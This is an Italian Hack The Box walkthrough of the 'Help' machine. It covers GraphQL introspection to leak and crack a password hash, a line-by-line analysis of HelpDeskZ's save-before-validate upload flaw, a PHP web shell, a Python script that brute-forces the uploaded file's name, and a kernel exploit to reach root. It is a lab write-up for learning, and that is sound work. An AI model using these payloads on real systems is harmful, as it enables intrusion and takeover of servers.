---
title: 'HTB Help Walkthrough: GraphQL e File Upload HelpDeskZ'
slug: htb-help-walkthrough
description: 'Write-UP completo di Hack The Box: Help. Enumerazione GraphQL, bypass file upload su HelpDeskZ con analisi del codice PHP vulnerabile, privesc kernel a root.'
image: /help-walktrough-hack-the-box.webp
draft: false
date: 2026-07-29T00:00:00.000Z
categories:
  - walkthroughs
subcategories:
  - easy
tags:
  - api
  - htb walktrough
  - File Upload
---

# HTB Help Walkthrough: GraphQL Introspection e File Upload Bypass su HelpDeskZ

**Difficoltà:** Facile
**Tecniche coperte:** GraphQL introspection, File Upload bypass (HelpDeskZ CVE), analisi codice PHP, kernel exploit privesc

Help è una macchina Hack The Box "Easy" che insegna una lezione fondamentale: capire *perché* una vulnerabilità esiste conta più che sapere *come* sfruttarla con un tool. In questa guida analizziamo il codice PHP vulnerabile riga per riga — pensata apposta per chi si sta avvicinando alla programmazione e all'offensive security allo stesso tempo.

## Ricognizione

Uno scan nmap classico rivela tre porte:

```bash
nmap -sC -sV -p 22,80,3000 10.10.10.121
```

```
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp   open  http    Apache httpd 2.4.18
3000/tcp open  http    Node.js Express framework
```

La porta 80 ospita la pagina di default di Apache — poco interessante a prima vista. Un [gobuster](/articoli/gobuster/) rivela però `/support`, un'istanza di **HelpDeskZ**, software di ticketing open source con una vulnerabilità nota di [file upload](/articoli/file-upload-attack/).

La porta 3000 è invece più insolita: risponde con `X-Powered-By: Express` (framework Node.js) e un messaggio JSON che invita a "trovare le credenziali con la query giusta". Non è un webserver tradizionale — è un'**API**, e il suggerimento sulla "query" fa pensare a [GraphQL](/articoli/graphql-exploitation/), un linguaggio di interrogazione per API sempre più diffuso (lo usano tra gli altri GitHub, Shopify e Yelp). Proviamo a visitare `/graphql`: risponde. Da qui parte la prima metà dell'attacco.

## Parte 1: enumerare l'API GraphQL

### Cos'è GraphQL, in due righe

A differenza di una API REST classica — dove ogni risorsa ha il suo endpoint fisso (`/api/users`, `/api/posts`) — GraphQL espone **un solo endpoint** (di solito `/graphql`). Sei tu, nella richiesta, a specificare esattamente quali campi vuoi ricevere: componi la query come un modulo su misura, invece di andare a un "ufficio" già pronto e fisso per ogni tipo di dato.

Il vantaggio per un attaccante: se l'API ha l'**introspection** attiva (spesso lasciata accesa per errore anche in produzione), puoi chiedere direttamente allo schema "che campi esistono?" — senza bisogno di indovinare nulla. È di fatto l'equivalente di un `SHOW TABLES` per un'API: prima mappi la struttura, poi interroghi solo ciò che ti serve. Per un approfondimento completo sui meccanismi di attacco a GraphQL, il [GraphQL cheat sheet di PortSwigger](https://portswigger.net/web-security/graphql) resta una delle risorse più complete disponibili.

### Step 1 — Introspection query

```bash
curl -s -X POST "http://10.10.10.121:3000/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { name fields { name } } } } }"}'
```

Risposta:

```json
{"data":{"__schema":{"queryType":{"name":"Query","fields":[{"name":"user","description":""}]}}}}
```

Lo schema ci dice che esiste un campo `user` sotto `Query`. Tutto ciò che inizia con doppio underscore (`__Schema`, `__Type`, `__EnumValue`...) fa parte delle specifiche standard di GraphQL — esiste identico su qualsiasi API GraphQL al mondo, non è specifico di questa macchina. Va ignorato.

### Step 2 — Che campi ha `User`?

```bash
curl -s -X POST "http://10.10.10.121:3000/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"User\") { name fields { name } } }"}'
```

```json
{"data":{"__type":{"name":"User","fields":[{"name":"username"},{"name":"password"}]}}}
```

### Step 3 — Prendiamo i dati veri

```bash
curl -s -X POST "http://10.10.10.121:3000/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { username password } }"}'
```

```json
{"data":{"user":{"username":"helpme@helpme.com","password":"5d3c93182bb20f07b994a7f617e99cff"}}}
```

L'hash MD5 si crackano su [crackstation.net](https://crackstation.net) in pochi secondi: `godhelpmeplz`.

> **Nota per chi inizia**: introspection, `__schema`, `__type` sono meccanismi *interni* di GraphQL, presenti su ogni installazione. La parte "custom" dell'applicazione — quella che varia da sito a sito — è solo il tipo `User` con i suoi due campi. Il resto è rumore di sistema da imparare a riconoscere e scartare.

## Parte 2: la vulnerabilità di HelpDeskZ — analisi del codice

Qui sta la parte più istruttiva della macchina. Invece di lanciare un exploit pubblico e basta, vediamo *cosa c'è di rotto* nel codice sorgente reale di HelpDeskZ v1.0.2 (disponibile pubblicamente su GitHub, essendo open source). La vulnerabilità è documentata anche su [Exploit-DB (EDB-ID 40300)](https://www.exploit-db.com/exploits/40300).

### Il bug in una frase

**Il file viene salvato sul server PRIMA che il controllo di sicurezza venga eseguito — e se il controllo fallisce, nessuno lo cancella.**

### Riga per riga

Il codice sta in `controllers/submit_ticket_controller.php`:

```php
$uploaddir = UPLOAD_DIR.'tickets/';
if($_FILES['attachment']['error'] == 0){
    $ext = pathinfo($_FILES['attachment']['name'], PATHINFO_EXTENSION);
    $filename = md5($_FILES['attachment']['name'].time()).".".$ext;
    $uploadedfile = $uploaddir.$filename;

    if (!move_uploaded_file($_FILES['attachment']['tmp_name'], $uploadedfile)) {
        $error_msg = $LANG['ERROR_UPLOADING_A_FILE'];
    } else {
        $fileverification = verifyAttachment($_FILES['attachment']);
        switch($fileverification['msg_code']){
            case '1': $error_msg = $LANG['INVALID_FILE_EXTENSION']; break;
            case '2': $error_msg = $LANG['FILE_NOT_ALLOWED']; break;
            case '3': $error_msg = str_replace('%size%',$fileverification['msg_extra'],$LANG['FILE_IS_BIG']); break;
        }
    }
}
```

**Riga 1-2**: `$uploaddir` è la cartella di destinazione (`uploads/tickets/`). Il codice controlla solo che l'upload HTTP non abbia avuto errori di trasporto (`$_FILES['attachment']['error'] == 0`) — non l'estensione, non il contenuto.

**Riga 3-5**: qui viene generato il nome file finale.

```php
$ext = pathinfo($_FILES['attachment']['name'], PATHINFO_EXTENSION);
$filename = md5($_FILES['attachment']['name'].time()).".".$ext;
```

`pathinfo(..., PATHINFO_EXTENSION)` estrae l'estensione dal nome originale (`shell.php` → `php`).

Sulla riga sotto, il punto `.` in PHP non è un separatore decimale né un punto qualunque: è l'**operatore di concatenazione**, cioè incolla due stringhe insieme. Quindi `$_FILES['attachment']['name'].time()` prende il nome del file (`"shell.php"`) e ci attacca subito dopo l'orario del server in secondi (es. `1785280763`), producendo una stringa unica tipo `"shell.php1785280763"`. Questa stringa passa poi dentro `md5(...)`, che la trasforma nell'hash finale — quello sarà il nome reale del file salvato sul server, con l'estensione originale riattaccata in coda.

Questo è già il primo problema di design: `time()` non è casuale, è **prevedibile**. Chi conosce (anche solo approssimativamente) l'orario del server e il nome del file caricato può ricalcolare lo stesso hash.

**Riga 7 — il cuore del bug:**

```php
if (!move_uploaded_file($_FILES['attachment']['tmp_name'], $uploadedfile)) {
```

Fermiamoci qui un momento, perché è la riga che fa la differenza tra "sito sicuro" e "sito bucato".

`move_uploaded_file()` è una funzione PHP che fa una cosa sola: sposta il file dalla sua posizione temporanea alla cartella finale. Se lo spostamento riesce, restituisce `true`. Se fallisce (permessi sbagliati, disco pieno), restituisce `false`.

Il punto `!` davanti è l'operatore NOT: ribalta un valore vero in falso e viceversa. Pensa a un amico che dice sempre il contrario di quello che pensa davvero: se lui pensa "sì", dice "no"; se pensa "no", dice "sì". `!` funziona esattamente così su `true`/`false`.

Quindi `!move_uploaded_file(...)` diventa `true` **solo quando lo spostamento fallisce**. Nel caso normale — file spostato con successo, che sia `.jpg` o `.php` non importa — questo `if` è `false`, e il codice salta dritto all'`else`.

Questo è il primo dettaglio da notare: `move_uploaded_file()` non guarda mai l'estensione del file. Sposta tutto, indiscriminatamente. Il controllo sul tipo di file arriva solo dopo, nel ramo `else`.

**Riga 9 — dopo, non prima:**

```php
$fileverification = verifyAttachment($_FILES['attachment']);
```

A questo punto il file è **già** fisicamente salvato sul disco del server, in `uploads/tickets/`, con un nome pubblico raggiungibile via URL. Solo ORA viene chiamata `verifyAttachment()` per controllare se quel file andava bene.

Se il verdetto è negativo (es. estensione `.php` non permessa), lo `switch` sotto stampa solo un messaggio di errore a schermo — non c'è nessuna riga che dice "quindi cancella il file". Il file resta lì, silenziosamente, indipendentemente dal risultato del controllo.

Riassumendo l'ordine delle operazioni: **1) salva il file → 2) controlla se andava salvato**. L'ordine corretto sarebbe l'esatto contrario: prima verificare, poi — solo se il controllo passa — salvare. Questo scambio di priorità è l'intero bug.

Un'ultima cosa su questo blocco, il `switch`:

```php
switch($fileverification['msg_code']){
    case '1': $error_msg = $LANG['INVALID_FILE_EXTENSION']; break;
    case '2': $error_msg = $LANG['FILE_NOT_ALLOWED']; break;
    case '3': $error_msg = str_replace('%size%',$fileverification['msg_extra'],$LANG['FILE_IS_BIG']); break;
}
```

Uno `switch` è solo un modo più leggibile di scrivere tanti `if/elseif` di fila, quando devi confrontare la stessa variabile con più valori possibili. Qui prende il codice numerico restituito da `verifyAttachment()` (`msg_code`) e decide quale messaggio di errore mostrare — `1` per estensione malformata, `2` per estensione non in whitelist, `3` per file troppo grande. Nota bene: questo `switch` si occupa **solo** di scegliere il testo dell'errore da mostrare all'utente. Non tocca mai il file salvato su disco — coerente con quanto detto sopra, nessuno lo cancella qui.

### La funzione di verifica

```php
function verifyAttachment($filename){
    global $db;
    $namepart = explode('.', $filename['name']);
    $totalparts = count($namepart)-1;
    $file_extension = $namepart[$totalparts];

    if(!ctype_alnum($file_extension)){
        $msg_code = 1;
    } else {
        $filetype = $db->fetchRow("SELECT count(id) AS total, size FROM ".TABLE_PREFIX."file_types WHERE type='".$db->real_escape_string($file_extension)."'");
        if($filetype['total'] == 0){
            $msg_code = 2;
        } elseif($filename['size'] > $filetype['size'] && $filetype['size'] > 0){
            $msg_code = 3;
        } else {
            $msg_code = 0;
        }
    }
    return array('msg_code' => $msg_code, 'msg_extra' => $misc);
}
```

Analizziamo anche questa, un pezzo alla volta, perché è dove sta la whitelist delle estensioni permesse.

```php
$namepart = explode('.', $filename['name']);
```

`explode('.', ...)` spezza una stringa in un **array** (una lista con indici numerati da 0) usando il punto come separatore. Con `"shell.php"` in ingresso, il risultato è:

```
$namepart[0] = "shell"
$namepart[1] = "php"
```

```php
$totalparts = count($namepart)-1;
```

`count($namepart)` conta quanti elementi ci sono nell'array: in questo caso `2`. Meno 1 fa `1` — è l'indice dell'**ultimo** elemento dell'array (gli array in PHP, come in quasi tutti i linguaggi, partono da 0, non da 1).

```php
$file_extension = $namepart[$totalparts];
```

Questa riga non concatena nulla insieme: prende **un solo elemento** dall'array, quello all'indice `1`, cioè `"php"`. Questo trucco (`count()-1` per prendere l'ultimo pezzo) funziona anche con nomi file più complessi come `"archivio.tar.gz"`, dove prenderebbe correttamente `"gz"` come estensione, ignorando i punti precedenti.

```php
if(!ctype_alnum($file_extension)){
    $msg_code = 1;
}
```

`ctype_alnum()` controlla se una stringa contiene *solo* lettere e numeri — niente punti, spazi, o caratteri strani. Con `!` davanti (lo stesso operatore NOT di prima), l'`if` scatta quando l'estensione **non** è alfanumerica pulita — utile per bloccare tentativi come `shell.ph.p` o simili.

```php
$filetype = $db->fetchRow("SELECT count(id) AS total, size FROM ".TABLE_PREFIX."file_types WHERE type='".$db->real_escape_string($file_extension)."'");
```

Qui il codice interroga il **database**, tabella `file_types`, cercando una riga dove `type` corrisponde all'estensione trovata. Nota bene: la lista delle estensioni permesse e i limiti di dimensione massima NON sono scritti nel codice PHP — vivono nel database. Il codice si limita a leggerli.

Se la query non trova nessuna riga (`total == 0`), l'estensione non è nella whitelist → `msg_code = 2`.

Sull'`elseif` successivo occhio a non confondersi: compaiono due valori diversi chiamati entrambi "size", ma non sono la stessa cosa.

```php
elseif($filename['size'] > $filetype['size'] && $filetype['size'] > 0){
    $msg_code = 3;
}
```

`$filename['size']` è quanto pesa **il file che hai appena caricato tu** (info presa direttamente dall'upload HTTP). `$filetype['size']` è invece il limite massimo permesso per quell'estensione, letto dal database nella riga sopra. Il confronto dice: "se il mio file supera il limite consentito per quel tipo, E quel limite non è 0 (0 = nessun limite)" → allora è troppo grande, `msg_code = 3`. Altrimenti → `msg_code = 0`, tutto ok, nessun problema trovato.

**Il punto chiave**: anche in caso di `msg_code = 1` o `2` (file bocciato), la funzione restituisce solo un codice di errore. Nessuna `unlink()`, nessuna cancellazione. Il file resta lì.

## Parte 3: sfruttare il bug

Sapendo che il file `.php` malevolo resta comunque salvato, serve solo trovarne il nome (l'hash MD5 imprevedibile a occhio, ma ricostruibile forzando i possibili timestamp).

1. Si crea un ticket allegando una [web shell](/articoli/web-shell/) PHP minimale:

```php
<?php system($_REQUEST['cmd']); ?>
```

1. Il sito risponde con un errore ("File is not allowed") — ma il file è comunque salvato in `/support/uploads/tickets/`.
2. Uno script bruteforcia i possibili nomi, provando timestamp vicini all'orario corrente del server. Qui vale la pena una nota pratica: il giorno di questo test (29 luglio) le VPN EU di HTB erano fuori uso, quindi la connessione è passata dal server US — con un disallineamento di orario tra il nostro Kali e il server della box di oltre un'ora. Gli exploit pubblici in giro calcolano l'orario dal proprio orologio locale (`time.time()`), che in quella situazione dava risultati completamente sbagliati.

La soluzione è stata scrivere uno script che non si fida affatto dell'orologio locale, ma legge l'orario direttamente dall'header HTTP `Date` restituito dal server nel momento stesso in cui parte lo script:

```python
from urllib2 import urlopen
import hashlib, sys, email.utils

base_url = sys.argv[1]
file_name = sys.argv[2]

req = urlopen(base_url)
server_date = req.info().getheader('Date')
unixtime = int(email.utils.mktime_tz(email.utils.parsedate_tz(server_date)))

for offset in range(300):
    pre_encode = file_name + str(unixtime - offset)
    encoded = hashlib.md5(pre_encode).hexdigest()
    url = base_url + "/" + encoded + ".php"
    try:
        if urlopen(url).getcode() == 200:
            print "Found: " + url
            break
    except:
        pass
```

Il punto chiave è la riga `unixtime = int(email.utils.mktime_tz(...))`: prende il valore dell'header `Date` (che è l'orario vero del server, sempre, indipendentemente da dove ti trovi tu o quale VPN stai usando) e lo trasforma in timestamp Unix. Da lì, il loop prova 300 secondi a ritroso partendo da quell'orario — non dal nostro. Questo rende lo script immune a qualsiasi differenza di fuso orario o VPN instabile.

1. Trovato l'URL, la web shell è raggiungibile:

```bash
curl "http://10.10.10.121/support/uploads/tickets/<hash>.php?cmd=id"
# uid=1000(help) gid=1000(help) ...
```

## Privilege escalation: help → root

```bash
uname -a
# Linux help 4.4.0-116-generic ... x86_64
```

L'output mostra un kernel Linux 4.4 — su una versione del genere vale sempre la pena controllare se esistono privilege escalation kernel-level già pubbliche, prima di cercare altre strade più complesse. Strumenti come `linux-exploit-suggester-2` fanno esattamente questo: confrontano la versione del kernel con un database di CVE note. Nel nostro caso emergono più candidate, tra cui **CVE-2017-16995** (nota anche come "get\_rekt"). Compilato ed eseguito, l'exploit sfrutta una vulnerabilità nel subsystem BPF del kernel per patchare direttamente le credenziali del processo corrente:

```bash
gcc -o exploit 45010.c
./exploit
# [+] credentials patched, launching shell...
# id
# uid=0(root) gid=0(root) ...
```

## Cosa portarsi a casa

Il vero insegnamento di questa macchina non è "esiste un exploit pubblico per HelpDeskZ" — è che **il controllo di sicurezza va sempre eseguito PRIMA di qualsiasi azione irreversibile**, mai dopo. Salvare un file e poi decidere se era valido è un ordine logico invertito che, da solo, azzera qualsiasi whitelist di estensioni per quanto ben scritta.

Per chi vuole approfondire i meccanismi di attacco visti qui, HackTheBox e box simili restano il modo migliore per esercitarsi. Sul resto del sito trovi guide dedicate a [file upload attack](/articoli/file-upload-attack/), [web shell](/articoli/web-shell/), [GraphQL exploitation](/articoli/graphql-exploitation/), [SQL injection](/articoli/sql-injection/) e [path traversal](/articoli/path-traversal/).
